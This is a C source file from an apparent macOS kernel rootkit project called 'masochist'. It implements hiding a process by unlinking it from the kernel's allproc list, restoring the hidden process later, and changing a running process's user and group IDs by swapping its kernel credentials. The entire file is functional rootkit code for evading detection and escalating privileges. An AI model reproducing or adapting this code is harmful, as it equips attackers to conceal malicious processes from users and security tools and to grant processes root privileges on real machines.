//
//  process.c
//  masochist
//
//  Created by Squiffy on 11/11/14.
//  Copyright (c) 2014 squiffypwn. All rights reserved.
//

#include <mach/mach_types.h>
#include <IOKit/IOLib.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach/mach_types.h>
#include <sys/systm.h>
#include <stdbool.h>
#include "proc_internal.h"
#include "symbol.h"

struct hiddenProc {

    struct proc *process;
    LIST_ENTRY(hiddenProc) processes;

};

LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;

struct proc *
get_process(pid_t pid) {

    struct proclist *allproc = find_symbol("_allproc");
    struct proc *process = NULL;

    LIST_FOREACH(process, allproc, p_list) {
        if(process->p_pid == pid)
            return process;
    }

    return 0;
}

kern_return_t
hide_process(pid_t pid) {

    /* Find the required symbols */
    struct proclist *allproc = find_symbol("_allproc");
    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");

    /* Make sure they're all resolved */
    if(!allproc || !proc_list_lock || !proc_list_unlock)
        return KERN_FAILURE;

    struct proc *process = NULL;

    /* Iterate through the entire process list just like Apple does */
    for (process = allproc->lh_first; process != 0; process = process->p_list.le_next) {

        /* If process is the process we're looking for, hide it */
        if(process->p_pid == pid) {
            /* XXX: Save into an array of hidden processes so we can recover it later */

            /* Lock the process list before we modify it */
            proc_list_lock();

            /* Actually hdie the process. */
            LIST_REMOVE(process, p_list);

            /* Unlock the list */
            proc_list_unlock();

            /* Add it to our list */

            struct hiddenProc *item = IOMalloc(sizeof(struct hiddenProc));

            item->process = process;

            LIST_INSERT_HEAD(&hidden_procs_head, item, processes);

            return KERN_SUCCESS;
        }

    }

    return KERN_FAILURE;

}

kern_return_t
show_process(pid_t pid) {

    struct hiddenProc *item;

    /* Find the required symbols */
    struct proclist *allproc = find_symbol("_allproc");
    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");

    LIST_FOREACH(item, &hidden_procs_head, processes) {

        if(item->process->p_pid == pid) {
            proc_list_lock();
            LIST_INSERT_HEAD(allproc, item->process, p_list);
            proc_list_unlock();
            
            LIST_REMOVE(item, processes);
            IOFree(item, sizeof(struct hiddenProc));
            return KERN_SUCCESS;
        }
    }

    return KERN_FAILURE;
}

kern_return_t
change_process_ownership(pid_t pid, uid_t uid, gid_t gid) {

    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
    kauth_cred_t (*kauth_cred_setuidgid)(kauth_cred_t, uid_t, gid_t) = find_symbol("_kauth_cred_setuidgid");

    struct proc *process = get_process(pid);

    if(process == NULL)
        return KERN_FAILURE;

    kauth_cred_t origId = process->p_ucred;
    kauth_cred_t newId = kauth_cred_setuidgid(origId, uid, gid);

    proc_list_lock();
    process->p_ucred = newId;
    proc_list_unlock();

    return KERN_SUCCESS;

}
